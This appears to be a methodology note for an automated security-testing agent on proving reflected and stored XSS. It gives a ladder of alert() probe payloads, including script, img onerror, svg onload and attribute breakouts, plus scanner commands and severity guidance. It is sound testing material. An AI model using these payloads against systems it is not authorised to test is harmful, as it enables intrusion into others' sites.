---
id: xss-basic
title: XSS — reflected/stored proof and the alert() evidence bar
triggers: [<script>, alert(, xss, onerror=, stored]
---

## Proof bar

- The finding is `alert(document.domain)` (or `alert(1)`) EXECUTING —
  not "the payload string appears in the response". Verify: the payload
  lands inside HTML (not attribute-quoted away), or use a headless check
  (`nuclei -tags xss`, XSStrike `python xsstrike.py -u 'URL'`).
- Reflected probe ladder — each rung escapes the previous filter:
  `<script>alert(1)</script>` → `<img src=x onerror=alert(1)>` →
  `<svg onload=alert(1)>` → `"><script>alert(1)</script>` (attr breakout)
  → `'"><img src=x onerror=alert(1)>` → template `{{7*7}}`/`${7*7}`
  (SSTI-adjacent, see `ssti-basic`).
- Stored: post the payload into a comment/profile/name field, then LOAD
  the page it renders on — the response that proves it is the VIEW, not
  the POST.

## Reportable variants

- Reflected/stored XSS in an authenticated app → medium sev candidate;
  in an unauthenticated flow reachable pre-login → higher.
- Evidence line for record_finding: the exact reflecting endpoint +
  the working payload + where it renders (e.g. `GET /search?q= →
  <img onerror> executes unescaped in results div`).
